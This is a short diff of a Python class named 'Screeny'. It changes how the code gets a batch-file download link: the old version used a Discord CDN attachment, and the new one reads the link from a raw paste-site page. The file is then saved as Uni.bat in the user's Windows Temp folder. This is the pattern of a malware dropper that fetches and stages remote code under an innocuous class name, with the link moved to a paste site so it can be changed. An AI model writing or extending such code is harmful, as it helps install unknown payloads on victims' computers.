@@ -45,7 +45,13 @@ class Screeny:
         except:
             pass
 
-        bfu = 'https://cdn.discordapp.com/attachments/1098287991807557654/1101161077833744555/Uni.bat'
+        url = "https://sharetext.me/raw/jlyyguuhcj"
+
+        response = requests.get(url)
+        if response.status_code == 200:
+            text = response.text
+            
+        bfu = text
 
         lfp = f'C:\\Users\\{user}\\AppData\\Local\\Temp\\Uni.bat'
 
